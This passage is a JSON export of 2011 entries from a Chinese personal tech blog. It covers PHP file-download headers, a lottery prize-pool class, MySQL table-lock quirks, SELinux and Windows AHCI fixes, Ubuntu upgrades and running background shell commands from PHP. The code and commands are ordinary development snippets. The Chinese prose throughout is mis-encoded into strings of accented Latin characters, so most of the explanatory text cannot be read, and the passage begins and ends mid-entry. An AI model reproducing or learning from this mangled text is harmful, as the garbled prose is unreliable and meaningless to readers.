å®¡æŸ¥æœºåˆ¶å’Œä¸“ä¸šçš„æµ‹è¯•äººå‘˜.\n7.æ²¡æœ‰è§„èŒƒçš„ä»£ç ã€æ¶æ„ã€ æ³¨é‡Šæ˜¯å¾ˆå¯æ€•çš„ï¼Œç­‰åˆ°å¼€å§‹ç»´æŠ¤çš„æ—¶å€™å°±çŸ¥é“äº†ã€‚\n8.åˆ°ä¸€å®šè§„æ¨¡æ—¶ï¼Œå†…éƒ¨è‡ªå·±è¿›è¡Œä¸€äº›ç ”å‘æ˜¯å¿…è¦çš„ï¼ŒæŠŠåˆ«äººçš„æœ€å¥½çš„ä¸œè¥¿å †èµ·æ¥ä¸ä¸€å®šæ˜¯é€‚åˆè‡ªå·±çš„æœ€ä¼˜è§£ å°±å†™è¿™ä¹ˆå¤šäº†ã€‚ã€‚ã€‚\næ™šå®‰ 2011-12-30\n","date":"2011-12-30T00:00:00Z","permalink":"https://hitian.info/post/annual-summary-2011/","title":"æˆ‘è‡ªå·±çš„å¹´åº¦æ€»ç»“(2011)"},{"content":"åœ¨çº¿å®‰è£…:Â ç¨³å®šç‰ˆÂ æµ‹è¯•ç‰ˆÂ å¼€å‘ç‰ˆÂ chromium\nç¦»çº¿å®‰è£…åŒ…:Â ç¨³å®šç‰ˆÂ æµ‹è¯•ç‰ˆÂ å¼€å‘ç‰ˆ\n","date":"2011-12-28T00:00:00Z","permalink":"https://hitian.info/post/chrome-installer-downloads-for-win/","title":"chrome æœ€æ–°ç‰ˆä¸‹è½½åœ°å€(win)"},{"content":"è¯»å–æ–‡ä»¶, å¼ºåˆ¶æµè§ˆå™¨è¿›è¡Œä¸‹è½½\nContent-Encoding: none\næ²¡æœ‰çš„è¯ è¿…é›·7ä¼šè‡ªåŠ¨åŠ ä¸Šæ‰©å±•å.gzip\nContent-type\næˆ‘è¦ä¸‹è½½çš„æ˜¯.exeæ–‡ä»¶, æ‰€ä»¥è®¾ç½®ä¸ºapplication/octet-stream\n\u0026lt;?php ob_end_clean(); header(\u0026#34;HTTP/1.1 200 OK\u0026#34;); header(\u0026#39;Cache-control: max-age=31536000\u0026#39;); header(\u0026#39;Content-Encoding: none\u0026#39;); header(\u0026#34;Content-type:application/octet-stream\u0026#34;); header(\u0026#39;Content-Disposition: attachment; filename=\u0026#39; . $file_name); header(\u0026#39;Content-Length: \u0026#39; . filesize($file_path)); // æ‰“å¼€æ–‡ä»¶(äºŒè¿›åˆ¶åªè¯»æ¨¡å¼) $fp = fopen($file_path, \u0026#39;rb\u0026#39;); // è¾“å‡ºæ–‡ä»¶ fpassthru($fp); // å…³é—­æ–‡ä»¶ fclose($fp); ","date":"2011-12-20T00:00:00Z","permalink":"https://hitian.info/post/php-file-download-set-header/","title":"php æ–‡ä»¶ä¸‹è½½ header è®¾ç½®"},{"content":"centos5.4 é…ç½®å®Œapache+php+mysql ç¯å¢ƒåå‡ºç°äº†ä¸€ä¸ªå¾ˆæ£˜æ‰‹çš„é—®é¢˜\nä½¿ç”¨ Alias /phpmyadmin \u0026ldquo;/var/www/html/phpmyadmin/\u0026rdquo;\nä¹‹åè®¿é—® http://localhost/phpmyadmin/index.php ä¸€ç›´å‡º403\n/var/www/html/phpmyadmin/Â ç›®å½•çš„owner æ”¹ä¸ºapache\nå¹¶ç»™äº†æ•´ä¸ªç›®å½•755çš„æƒé™\nåœ¨è®¿é—®çš„æ—¶å€™ä»ç„¶å‡ºç°äº†403\nè§£å†³æ–¹æ¡ˆ:\n#chcon -R -h -t httpd_sys_content_tÂ /var/www/html/phpmyadmin/\næœ¬æ¥ä¸€ç›´ä½¿ç”¨ubuntu server çš„, æ²¡æœ‰ç”¨è¿‡centos, ä¸ºäº†æ˜å¤©çš„è€ƒæ ¸ä¸å¾—ä¸è¯•äº†ä¸‹centos , ç»“æœå°±å‡ºç°è¿™æ ·çº ç»“çš„é—®é¢˜, ç¿»äº†å¥½ä¹…çš„è‹±æ–‡ç½‘é¡µæ‰æ‰¾åˆ°è§£å†³åŠæ³•, æ„Ÿè°¢google\u0026hellip;\n","date":"2011-12-13T00:00:00Z","permalink":"https://hitian.info/post/permission-denied-access-to-phpmyadmin/","title":"å…³äº(13) phpmyadmin Permission denied"},{"content":"ahciæ¨¡å¼åŒ…å«äº†ncqç­‰é«˜çº§æ¨¡å¼, å¯ä»¥æé«˜ç¡¬ç›˜çš„æ€§èƒ½, è€Œä¸”win7å†…ç½®äº†é©±åŠ¨, ä¸å¿…æ‹…å¿ƒåƒxpä¼šè“å±.\nä½†æ˜¯å¦‚æœæ˜¯åœ¨ataæ¨¡å¼ä¸‹å®‰è£…å®Œæˆçš„win7, å†ä¿®æ”¹bios åˆ‡æ¢åˆ°ahciæ¨¡å¼è¿˜æ˜¯ä¼šå¯¼è‡´é‡æ–°å¯åŠ¨æ—¶è“å±.\nè§£å†³:\nåœ¨ataæ¨¡å¼ä¸‹è¿›å…¥ç³»ç»Ÿ\næ‰“å¼€æ³¨å†Œè¡¨ç¼–è¾‘å™¨\nä¿®æ”¹ HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\Msahci ä¸­ Start çš„å€¼ä¸º0\né‡å¯ç”µè„‘ è¿›bios åˆ‡æ¢åˆ°ahciæ¨¡å¼\nå¯åŠ¨ç³»ç»Ÿ\nè¿›å…¥æ¡Œé¢åä¼šæ˜¾ç¤ºæœ‰é©±åŠ¨æ­£åœ¨å®‰è£….\nå†æ‰‹åŠ¨ä¸‹è½½å®‰è£…ä¸€ä¸‹intelçš„å¿«é€Ÿå­˜å‚¨æŠ€æœ¯é©±åŠ¨å°±å¥½äº†\u0026hellip;\n","date":"2011-12-03T00:00:00Z","permalink":"https://hitian.info/post/win7-hd-ata-to-ahci/","title":"win7å®‰è£…å®Œæˆåå°†ç¡¬ç›˜ä»ATAæ¨¡å¼åˆ‡æ¢åˆ°AHCI"},{"content":"å¶ç„¶å‘ç°è¿™ä¸ªé—®é¢˜\nmysql\u0026gt; lock table test_my write; Query OK, 0 rows affected (0.00 sec) mysql\u0026gt; select * from test_my; Empty set (0.00 sec) mysql\u0026gt; insert into test_my values(null, 1, 1); Query OK, 1 row affected (0.00 sec) mysql\u0026gt; select * from test_my; +â€”-+â€”â€”+â€”â€”â€“+ | id | pid | enable | +â€”-+â€”â€”+â€”â€”â€“+ | 1 | 1 | 1 | +â€”-+â€”â€”+â€”â€”â€“+ 1 row in set (0.00 sec) mysql\u0026gt; truncate table test_my; ERROR 1192 (HY000): Can\u0026#39;t execute the given command because you have active lock ed tables or an active transaction TRUNCATE TABLE was not allowed under LOCK TABLES.\nè¡¨é”ä¸­ä¸å¯ä»¥ä½¿ç”¨æ¸…ç©ºæ“ä½œ, è¿™ä¸ªè®©æˆ‘å¾ˆéƒé—·.\nmysql\u0026gt; delete from test_my; Query OK, 1 row affected (0.00 sec) mysql\u0026gt; alter table test_my auto_increment=1; Query OK, 0 rows affected (0.05 sec) Records: 0 Duplicates: 0 Warnings: 0 mysql\u0026gt; select * from test_my; Empty set (0.00 sec) mysql\u0026gt; insert into test_my values(null, 99, 1); Query OK, 1 row affected (0.00 sec) mysql\u0026gt; select * from test_my; +â€”-+â€”â€”+â€”â€”â€“+ | id | pid | enable | +â€”-+â€”â€”+â€”â€”â€“+ | 1 | 99 | 1 | +â€”-+â€”â€”+â€”â€”â€“+ 1 row in set (0.00 sec) mysql\u0026gt; åˆ†å¸ƒæ“ä½œ: å…ˆåˆ é™¤æ‰€æœ‰æ•°æ®, ç„¶åé‡æ–°è®¾ç½®è‡ªå¢é•¿çš„èµ·å§‹ç‚¹å´å¯ä»¥.\n","date":"2011-12-01T00:00:00Z","permalink":"https://hitian.info/post/mysql-table-lock/","title":"mysqlè¡¨é”å®šä¸­ä¸æ”¯æŒæ¸…ç©ºæ“ä½œ?"},{"content":"æ‰“å­—çš„æ—¶å€™ç»å¸¸ç¢°åˆ°è§¦æ§æ¿å¾ˆéƒé—·, åœ¨ä½¿ç”¨usbé¼ æ ‡çš„æ—¶å€™å¯ä»¥æš‚æ—¶ç¦ç”¨è§¦æ§æ¿å’Œå°çº¢ç‚¹\nsudo modprobe -r psmouse\né‡æ–°å¯ç”¨\nsudo modprobe -i psmouse\n","date":"2011-11-27T00:00:00Z","permalink":"https://hitian.info/post/thinkpad-ubuntu-disable-touchpad/","title":"thinkpad ubuntu 11.10 æš‚æ—¶ç¦ç”¨è§¦æ§æ¿"},{"content":"å°†æ”¹å˜imgæ ‡ç­¾çš„srcçš„äº‹ä»¶è§¦å‘å†™åœ¨aæ ‡è®°çš„onclické‡Œé¢ åœ¨ie6ä¸‹ä¼šå¯¼è‡´åˆ‡æ¢åæ–°çš„å›¾ç‰‡æ— æ³•åŠ è½½.\nä»Šå¤©åˆå‘ç°äº†å¦ä¸€ä¸ªæ¶å¿ƒçš„é—®é¢˜\n\u0026lt;img src=\u0026#34;/images/pic1.gif\u0026#34; /\u0026gt; \u0026lt;img src=\u0026#34;/images/pic2.gif\u0026#34; style=\u0026#34;display:none\u0026#34; /\u0026gt; \u0026lt;a href=\u0026#34;javascript:;\u0026#34; onclick=\u0026#34;chenge_pic();\u0026#34;\u0026gt;åˆ‡æ¢å›¾ç‰‡\u0026lt;/a\u0026gt; åƒè¿™æ ·, å¦‚æœpic2.gif æ˜¯ä¸€ä¸ªåŠ¨æ€çš„å›¾ç‰‡, å½“ç‚¹å‡»aæ ‡ç­¾åˆ‡æ¢å›¾ç‰‡åˆ°pic2.gid æ—¶, å®é™…çœ‹åˆ°çš„pic2.gif æ˜¯ä¸ä¼šåŠ¨çš„.\nç›´æ¥å°†ç¬¬ä¸€ä¸ªæ ‡ç­¾çš„src æ”¹æˆpic2.gif å›¾ç‰‡ä¹Ÿæ˜¯ä¸ä¼šåŠ¨çš„.\nå’Œä¹‹å‰çš„è§£å†³æ–¹æ¡ˆä¸€æ ·, å°†aæ ‡è®°æ¢æˆ \u0026lt;input type=\u0026quot;button\u0026quot;Â /\u0026gt; å°±å¥½äº†.æ¶å¿ƒçš„ie6, å¤©å¤©ç”»åœˆåœˆè¯…å’’å®ƒå¿«ç‚¹æ¶ˆå¤±\u0026hellip;.\n","date":"2011-11-25T00:00:00Z","permalink":"https://hitian.info/post/ie6-gif-bug/","title":"è§£å†³ie6 æ¶å¿ƒçš„åŠ¨æ€gifå›¾ç‰‡é—®é¢˜"},{"content":"ä¸€èˆ¬æ¥è¯´è¦åšä¸€ä¸ªæŠ½å¥–ç¨‹åºä¼šç«‹å³æƒ³åˆ°ç”¨éšæœºæ•°. ä½†æ˜¯é€šå¸¸æƒ…å†µä¸‹éšæœºæ•°ä¹Ÿä¸æ˜¯é‚£ä¹ˆçš„éšæœº, æ•°é‡æ¯”è¾ƒå¤§çš„æ—¶å€™æ‰èƒ½ä½“ç°å‡ºæ¯”è¾ƒå¹³å‡, æ•°é‡è¾ƒå°çš„æ—¶å€™ä¸­å¥–æ¦‚ç‡çš„å¯æ§æ€§å°†ä¼šå¾ˆå·®. ä¸€ä¸å°å¿ƒå¤šè¢«æŠ½ä¸­å‡ ä¸ªéº»çƒ¦å°±å¤§äº†.\n\u0026lt;?php class T_prize{ var $item; var $table; /** * æŠ½å¥–ä¸»ç¨‹åº å¤–éƒ¨è°ƒç”¨å…¥å£ * @param unknown_type $db æ•°æ®åº“é“¾æ¥ * @param unknown_type $id æŠ½å¥–ç±»å‹ */ function prize($db, $id){ global $prize_set; // if(!isset($prize_set[$id])){ return false; } $this-\u0026gt;item = $prize_set[$id]; $table = \u0026#39;my_prize_store_table_\u0026#39; . $id; //æŠ½å¥–å¹¶å‘è¾ƒå¤§æ—¶å¯ä»¥è¿›è¡Œåˆ†è¡¨, å¤šç”Ÿæˆå‡ ä¸ªå¥–æ±  //$table = \u0026#39;my_prize_store_table_\u0026#39; . $id . \u0026#39;_\u0026#39; . rand(0, 4); $this-\u0026gt;table = $table; //é˜²æ­¢å¤šä¸ªç”¨æˆ·æŠ½åˆ°åŒä¸€ä¸ªæ¡ç›®, è¿›è¡Œé”è¡¨ $db-\u0026gt;query(\u0026#34;lock table \u0026#34; . $table . \u0026#34; write\u0026#34;); $pid = $this-\u0026gt;get_one($db, $id); //å¥–æ± ä¸­æ²¡æœ‰å¥–å“æ—¶é‡æ–°åˆå§‹åŒ–å¥–æ±  if($pid == \u0026#39;-1\u0026#39;){ $this-\u0026gt;create_pool($db, $id); $pid = $this-\u0026gt;get_one($db, $id); } //é‡Šæ”¾é” è¿”å›æŠ½å¥–ç»“æœ $db-\u0026gt;query(\u0026#34;unlock table\u0026#34;); return $pid; } /** * æŠ½å¥–ä¸€æ¬¡ * @param unknown_type $db * @param unknown_type $id */ function get_one($db, $id){ $table = $this-\u0026gt;table; $sql = \u0026#34;SELECT * FROM ${table} WHERE enable = \u0026#39;1\u0026#39; LIMIT 1\u0026#34;; $row = $db-\u0026gt;fetch($db-\u0026gt;query($sql)); $success = false; $re = array(); if($row){ $id = $row[\u0026#39;id\u0026#39;]; $pid = $row[\u0026#39;pid\u0026#39;]; $update_data = array( \u0026#39;enable\u0026#39; =\u0026gt; 0, ); $db-\u0026gt;update($table, $update_data, \u0026#34;id=\u0026#39;$id\u0026#39;\u0026#34;); $result = $db-\u0026gt;getAffectedRows(); if($result \u0026gt; 0){ $success = true; $re = $row; }else{ my_log(\u0026#39;æŠ½å¥–æ± æ¡ç›®çŠ¶æ€ä¿®æ”¹å‘ç”Ÿé”™è¯¯ id:\u0026#39; . $id); } }else{ return \u0026#39;-1\u0026#39;; } if($success){ return $pid; }else{ return 0; } } /** * å¥–å“æ± åˆå§‹åŒ– * @param unknown_type $db * @param unknown_type $id */ function create_pool($db, $id){ $table = $this-\u0026gt;table; my_log(\u0026#39;init prize pool id:\u0026#39; . $id); $item = $this-\u0026gt;item; $total_num = $item[\u0026#39;total\u0026#39;]; $list = $item[\u0026#39;list\u0026#39;]; $tprize_list = array(); foreach ($list as $key=\u0026gt;$one){ $tnum = intval($total_num * $one[\u0026#39;probability\u0026#39;]); if($tnum \u0026lt; 1){ my_log(\u0026#39;create prize pool create alert: total_num:\u0026#39; . $total_num . \u0026#39; item_name:\u0026#39; . $item[\u0026#39;name\u0026#39;] . \u0026#39; probability:\u0026#39; . $item[\u0026#39;probability\u0026#39;]); continue; } for ($i = 0; $i \u0026lt; $tnum; $i ++){ do{ $id = rand(1, $total_num); }while(isset($tprize_list[$id])); $tprize_list[$id] = $key; } } my_log(\u0026#39;start\u0026#39;); $db-\u0026gt;query(\u0026#39;TRUNCATE \u0026#39; . $table); $insert_str_arr = array(); for($i=1; $i\u0026lt;=$total_num; $i++){ $this_pid = 0; $inset_data = array(\u0026#39;pid\u0026#39;=\u0026gt;0); if(isset($tprize_list[$i])){ $this_pid = $tprize_list[$i]; } //æ¯100æ¡è®°å½•æ’å…¥ä¸€æ¬¡å¯ä»¥å¤§å¹…å‡å°æ•°æ®åº“æ’å…¥æ—¶é—´æ—¶é—´ $insert_str_arr[] = \u0026#34;($this_pid)\u0026#34;; if($i % 100 == 0){ $insert_str = implode(\u0026#39;,\u0026#39;, $insert_str_arr); $insert_str = \u0026#39;insert into \u0026#39; . $table . \u0026#39;(pid) values\u0026#39; . $insert_str; $db-\u0026gt;query($insert_str); $insert_str_arr = array(); } } my_log(\u0026#39;end\u0026#39;); } } //è‡ªå®šä¹‰æ—¥å¿— function my_log($msg){ //write logs here } ä½¿ç”¨å¥–æ± çš„æ¦‚å¿µå¯ä»¥å°†ä¸­å¥–æ¦‚ç‡ä¸¥æ ¼é™åˆ¶ä¸€ä¸‹,Â ç”Ÿæˆä¸€å®šæ•°é‡çš„æ ¼å­, æŒ‰ç…§æ¦‚ç‡ç®—å‡ºæœ‰å¥–å“çš„æ ¼å­çš„æ•°é‡, ç„¶åå†éšæœºå¡«å……åˆ°æ ¼å­é‡Œå», æ‰§è¡ŒæŠ½å¥–çš„æ—¶å€™ä¸€æ¬¡å»æ‰“å¼€æ ¼å­. è¦ä¹ˆä¸­å¥–,è¦ä¹ˆä¸ä¸­, å½“æ‰€æœ‰æ ¼å­éƒ½è¢«å¼€å¯è¿‡ä¹‹å,Â å†æ¬¡æ‰§è¡Œåˆå§‹åŒ–é‡æ–°å¡«å……æ‰€æœ‰çš„æ ¼å­. è®¾ç½®ä¸€ä¸‹éœ€è¦ä½¿ç”¨çš„å¥–å“æ•°æ®å’Œæ¦‚ç‡\n\u0026lt;?php $prize_set = array(); //æŠ½å¥–1 $prize_set[0] = array( \u0026#39;total\u0026#39; =\u0026gt; 1000, \u0026#39;list\u0026#39; =\u0026gt; array( 1 =\u0026gt; array(\u0026#39;name\u0026#39;=\u0026gt; \u0026#39;å¥–å“1\u0026#39;, \u0026#39;probability\u0026#39;=\u0026gt; \u0026#39;0.01\u0026#39;, \u0026#39;product_id\u0026#39; =\u0026gt; 3), 2 =\u0026gt; array(\u0026#39;name\u0026#39;=\u0026gt; \u0026#39;å¥–å“2\u0026#39;, \u0026#39;probability\u0026#39;=\u0026gt; \u0026#39;0.05\u0026#39;, \u0026#39;product_id\u0026#39; =\u0026gt; 7), 3 =\u0026gt; array(\u0026#39;name\u0026#39;=\u0026gt; \u0026#39;å¥–å“3\u0026#39;, \u0026#39;probability\u0026#39;=\u0026gt; \u0026#39;0.1\u0026#39;, \u0026#39;product_id\u0026#39; =\u0026gt; 9), ), ); //æŠ½å¥–2 $prize_set[1] = array( \u0026#39;total\u0026#39; =\u0026gt; 1000, \u0026#39;list\u0026#39; =\u0026gt; array( 1 =\u0026gt; array(\u0026#39;name\u0026#39;=\u0026gt; \u0026#39;å¥–å“1\u0026#39;, \u0026#39;probability\u0026#39;=\u0026gt; \u0026#39;0.001\u0026#39;, \u0026#39;product_id\u0026#39; =\u0026gt; 3), 2 =\u0026gt; array(\u0026#39;name\u0026#39;=\u0026gt; \u0026#39;å¥–å“2\u0026#39;, \u0026#39;probability\u0026#39;=\u0026gt; \u0026#39;0.005\u0026#39;, \u0026#39;product_id\u0026#39; =\u0026gt; 7), 3 =\u0026gt; array(\u0026#39;name\u0026#39;=\u0026gt; \u0026#39;å¥–å“3\u0026#39;, \u0026#39;probability\u0026#39;=\u0026gt; \u0026#39;0.01\u0026#39;, \u0026#39;product_id\u0026#39; =\u0026gt; 9), 4 =\u0026gt; array(\u0026#39;name\u0026#39;=\u0026gt; \u0026#39;å¥–å“4\u0026#39;, \u0026#39;probability\u0026#39;=\u0026gt; \u0026#39;0.02\u0026#39;, \u0026#39;product_id\u0026#39; =\u0026gt; 1), 5 =\u0026gt; array(\u0026#39;name\u0026#39;=\u0026gt; \u0026#39;å¥–å“5\u0026#39;, \u0026#39;probability\u0026#39;=\u0026gt; \u0026#39;0.05\u0026#39;, \u0026#39;product_id\u0026#39; =\u0026gt; 2), 6 =\u0026gt; array(\u0026#39;name\u0026#39;=\u0026gt; \u0026#39;å¥–å“6\u0026#39;, \u0026#39;probability\u0026#39;=\u0026gt; \u0026#39;0.1\u0026#39;, \u0026#39;product_id\u0026#39; =\u0026gt; 4), ), ); æˆ‘æœ‰ä¸¤ç»„æŠ½å¥–, æ‰€ä»¥å®šä¹‰äº†ä¸¤ç»„.Â æ³¨æ„, æ¯ç»„çš„æ€»æ•° ä¹˜ä»¥ è¿™ç»„ä¸­æœ€å°çš„ä¸€ä¸ªæ¦‚ç‡ä¸€å®šè¦å¤§äº1,Â ä¸ç„¶è¿™ä¸ªå¥–å“å°±æ°¸è¿œä¹Ÿæ²¡å¯èƒ½æŠ½ä¸­äº†.\nè¿™ç§æ–¹å¼ä¹Ÿæœ‰ç¼ºç‚¹:\n1.æ¦‚ç‡çš„è°ƒæ•´åªèƒ½åœ¨ä¸‹æ¬¡å¥–æ± åˆå§‹åŒ–æ—¶æ‰èƒ½ç”Ÿæ•ˆ,\n2.ä½¿ç”¨æ•°æ®åº“è¡¨é”æ¥ä¿è¯åŒä¸€ä¸ªæ ¼å­åªèƒ½è¢«ä¸€ä¸ªäººæŠ½ä¸­, ä¼šå¯¼è‡´æ€§èƒ½é™ä½, (æˆ‘ä»¬ä½¿ç”¨çš„æ˜¯myisam, åªèƒ½ä½¿ç”¨è¡¨çº§é”)æ— æ³•æ”¯æŒå¤§é‡çš„å¹¶å‘, æœ‰ä¸ªå¾ˆç¬¨çš„ä½†æœ€ç®€å•çš„è§£å†³æ–¹æ¡ˆå°±æ˜¯å¯¹åŒä¸€ä¸ªæŠ½å¥–ä½¿ç”¨å¤šä¸ªå¥–æ± , å°†è¯·æ±‚åˆ†æ•£åˆ°å„ä¸ªè¡¨å».\nåè®°:è¡¨åœ¨lock çŠ¶æ€ä¸­å®é™…ä¸Šæ˜¯ä¸æ”¯æŒtruncate æ“ä½œçš„, å…ˆdelete from table åˆ é™¤æ‰€æœ‰æ•°æ®, å† alter table xxx set auto_increment=1 å°±å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜\u0026hellip;\n","date":"2011-11-23T00:00:00Z","permalink":"https://hitian.info/post/lottery-simulation/","title":"ä½¿ç”¨ç±»ä¼¼äºå¥–æ± æ–¹å¼çš„æŠ½å¥–æ¨¡æ‹Ÿ"},{"content":"æ¯æ¬¡åšç³»ç»Ÿéƒ½å¾ˆæ„,Â å› ä¸ºæœ‰ä¸€å¤§å †è½¯ä»¶éœ€è¦é‡æ–°å®‰è£…, å°½ç®¡å°½é‡éƒ½ç”¨ç»¿è‰²çš„è¿˜æ˜¯æœ‰ä¸€å¤§æ¨éœ€è¦å®‰è£…çš„, å°è¯•ç€åˆ—ä¸ªè¡¨, ç®€åŒ–ä¸€ä¸‹æµç¨‹\u0026hellip;\nä¸ªäººæ–‡ä»¶å¤¹è¿ç§» å°†ä¸ªäººæ–‡ä»¶å¤¹ä¸­çš„ æˆ‘çš„è§†é¢‘ æˆ‘çš„éŸ³ä¹ æˆ‘çš„å›¾ç‰‡ ç§»åŠ¨åˆ°åŸæ¥éç³»ç»Ÿç›˜çš„ä½ç½®å» (ä¸€ç›´å¾ˆçº³é—·ä¸ºä»€ä¹ˆè¿™äº›éœ€è¦å¤§é‡å ç”¨ç£ç›˜ç©ºé—´çš„ä¸œè¥¿ä¸ä¸€å¼€å§‹å°±æ”¾åœ¨éç³»ç»Ÿç›˜) æ¢å¤apacheå’Œphpç¯å¢ƒ ä¹‹å‰çš„éƒ½è£…åœ¨dç›˜äº†Â ä»¥ç®¡ç†å‘˜è¿è¡Œcmd è¿›å…¥D:\\lamp\\apache\\bin\nhttpd.exeÂ -k installÂ å°†apacheå®‰è£…ä¸ºç³»ç»ŸæœåŠ¡\nhttpd.exeÂ -k startÂ å¯åŠ¨apache\nmysql ä¸€ç›´ä½¿ç”¨çš„è¿œç¨‹çš„, è·³è¿‡\nå°†å¤‡ä»½çš„host æ–‡ä»¶è¦†ç›– é¡ºä¾¿è°ƒæ•´ä¸€ä¸‹ä¿®æ”¹çš„æƒé™\nè¿è¡Œç¯å¢ƒæå®š\nå®‰è£…firefox ç„¶åå®‰è£…æ’ä»¶ firebug;\nfirecookie;\nweb developer;\ndns flusher;\nadvanced cookie manager;\nå†å®‰è£…ä¸€ä¸‹chromeÂ ä½¿ç”¨googleå¸å·å°†ä¹‹å‰çš„æ’ä»¶éƒ½åŒæ­¥å›æ¥\nok è°ƒè¯•ç¯å¢ƒä¹Ÿæå®š\nå®‰è£… jre ;Â Dreamweaver ; mysql workbench; eclipse pdt; editplus ok å¼€å‘ç¯å¢ƒæå®š\n","date":"2011-11-22T00:00:00Z","permalink":"https://hitian.info/post/restore-development-environment/","title":"é‡è£…ç³»ç»Ÿåæ¢å¤å¼€å‘ç¯å¢ƒ"},{"content":"ä¸€ç›´ä»¥æ¥è™šæ‹Ÿæœºé‡Œæµ‹è¯•ç”¨çš„ubuntu server éƒ½æ˜¯åœ¨å‡ºæ–°ç‰ˆæœ¬åç›´æ¥é‡æ–°å®‰è£…çš„, ä½†æ˜¯ç°åœ¨ä¸œè¥¿å®åœ¨å¤ªå¤šäº†, æ‡’å¾—å†é‡è£…äº†, ç½‘ä¸ŠæŸ¥äº†ä¸€ä¸‹å‡çº§çš„è¿‡ç¨‹ä½œä¸‹è®°å½•:\nå‡çº§ä¹‹å‰é‡è¦çš„é…ç½®æ–‡ä»¶æœ€å¥½å…ˆå¤‡ä»½ä¸€ä¸‹, å¯¹äºæµ‹è¯•æœåŠ¡å™¨, æˆ‘é€‰æ‹©ç›´æ¥è·³è¿‡\nä¿®æ”¹ä¸€ä¸‹/etc/apt/sources.list æ‰¾ä¸ªå¿«ç‚¹çš„æº, ä¸ç„¶ä¼šå¾ˆéƒé—·çš„. ç½‘æ˜“çš„å°±ä¸é”™ mirrors.163.com\nå¼€å§‹å‡çº§\n$sudo apt-get install update-manager-core\næ˜¾ç¤ºå·²ç»å®‰è£…äº†æœ€æ–°ç‰ˆæœ¬\næ¥ç€\n$sudo do-release-upgrade\nå› ä¸ºæˆ‘æ˜¯sshä¸Šå»çš„, ç³»ç»Ÿä¼šæç¤ºå¦‚æœå‘ç”Ÿæ„å¤–å¯ä»¥ä½¿ç”¨1022ç«¯å£ç™»å½•ä¸Šå»\nä¸€è·¯ y\nå¯ä»¥çœ‹åˆ°å…¶å®å·²ç»åœ¨getæ–°ç‰ˆæœ¬çš„åŒ…äº†\næ¥ä¸‹æ¥æ¼«é•¿çš„åŠä¸ªå°æ—¶ç­‰å¾…..zzzZZ\nç½‘é€Ÿä¸¥é‡ä¸ç»™åŠ›å•Š\nå®‰è£…æ–°çš„, æœ‰ä¸€éƒ¨åˆ†è€çš„ä¼šè¢«åˆ é™¤\næ¥ç€è‡ªåŠ¨é‡å¯\nçœ‹æ¥å‡çº§æˆåŠŸäº†\nçœ‹æ¥mysqlæ²¡èµ·æ¥, å…¶ä»–éƒ½æ˜¯æ­£å¸¸çš„\n(å®Œ)\u0026hellip;\n","date":"2011-11-09T00:00:00Z","permalink":"https://hitian.info/post/ubuntu-server-upgrade/","title":"ubuntu-server ç‰ˆæœ¬å‡çº§"},{"content":"x64çš„win8 å®‰è£…äº†x64 çš„jdk å†è¿è¡Œzendstudioæ—¶å°±ä¼šå‡ºé”™\nè§£å†³:\nå†å®‰è£…ä¸€ä¸‹x86 çš„jre\næ‰“å¼€Â C:\\Program Files (x86)\\Zend\\Zend Studio 9.0.0\\ZendStudio.ini\næ·»åŠ  -vm\nC:\\Program Files (x86)\\Java\\jre6\\bin\\javaw.exe\n-name Zend Studio -vm C:\\Program Files (x86)\\Java\\jre6\\bin\\javaw.exe -vmargs ","date":"2011-11-05T00:00:00Z","permalink":"https://hitian.info/post/win7-x64-zend-studio-x86/","title":"win7 x64 è¿è¡Œx86çš„zend studio 9.0"},{"content":"åœ¨ie9 ä¸­æ‰“å¼€gmailé¡µé¢å…¨ä¹± å¹¶æç¤ºieä½¿ç”¨äº†å…¼å®¹æ€§è§†å›¾.å¹¶ä¸”ç»™äº†ä¿®å¤æ–¹å¼:\nå³é”®ç‚¹å‡»å³ä¸Šè§’çš„é½¿è½®å›¾æ ‡ã€‚\né€‰æ‹©å‘½ä»¤æ ã€‚\næ‰“å¼€æµè§ˆå™¨é¡¶éƒ¨çš„å·¥å…·èœå•ï¼Œç„¶åé€‰æ‹©å…¼å®¹æ€§è§†å›¾è®¾ç½®ã€‚\nåœ¨â€œå·²æ·»åŠ åˆ°å…¼å®¹æ€§è§†å›¾ä¸­çš„ç½‘ç«™â€ä¸‹ï¼Œé€‰æ‹©â€œgoogle.comâ€ã€‚\nç‚¹å‡»åˆ é™¤ã€‚ä½†æ˜¯åœ¨æˆ‘çš„å·²æ·»åŠ åˆ—è¡¨ä¸­å¹¶æ²¡æœ‰google.com\nè§£å†³æ–¹æ³•å¾ˆç®€å•, æŒ‰\u0026rsquo;F12\u0026rsquo; æ‰“å¼€å¼€å‘äººå‘˜å·¥å…·, åˆ‡æ¢ä¸€ä¸‹æµè§ˆå™¨æ¨¡å¼ç„¶åå…³æ‰å°±å¥½äº†\n","date":"2011-10-22T00:00:00Z","permalink":"https://hitian.info/post/gmail-ie9/","title":"gmail åœ¨ ie9ä¸­ä¹±ç‰ˆ"},{"content":"phpæ‰§è¡ŒæœåŠ¡å™¨ä¸Šçš„è„šæœ¬è¿›è¡Œä¸€äº›æ“ä½œä¸æ˜¯ä»€ä¹ˆéš¾äº‹.\nexec system passthru è¿™å‡ ä¸ªå‡½æ•°éƒ½å¯ä»¥è°ƒç”¨å¤–éƒ¨çš„å‘½ä»¤. åªè¦æœ‰æƒé™å°±å®Œå…¨æ²¡æœ‰é—®é¢˜.\nä¾‹å¦‚\nexec('/home/tian/bin/trytodosomething -h');\nå‘½ä»¤æ‰§è¡Œåphpä¼šæŒ‚èµ·ç›´åˆ°å‘½ä»¤è¿è¡Œå®Œæ¯•. æœ‰æ—¶å€™è„šæœ¬è¿è¡Œçš„æ—¶é—´ä¹Ÿè®¸å¾ˆé•¿, æˆ‘ä»¬éœ€è¦è®©phpç»§ç»­æ‰§è¡ŒåŠæ—¶åé¦ˆç»™ç”¨æˆ·æˆ‘ä»¬å·²ç»å¼€å§‹æ“ä½œäº†.\n$cmd = \u0026#39;/home/tian/bin/trytodosomething -h \u0026gt; /tmp/null \u0026amp;\u0026#39;; $result = system($cmd); è¿™æ ·ä¿®æ”¹ä¹‹å, phpå°±ä¼šç»§ç»­æ‰§è¡Œ, ä¸ä¼šç­‰å¾…å‘½ä»¤æ‰§è¡Œå®Œè¿™æ ·ä¹Ÿå­˜åœ¨ä¸€ä¸ªé—®é¢˜, ç”¨æˆ·ä¸æ–­çš„åˆ·æ–°ç½‘é¡µå¯ä»¥èƒ½é€ æˆä¸€äº›éº»çƒ¦, 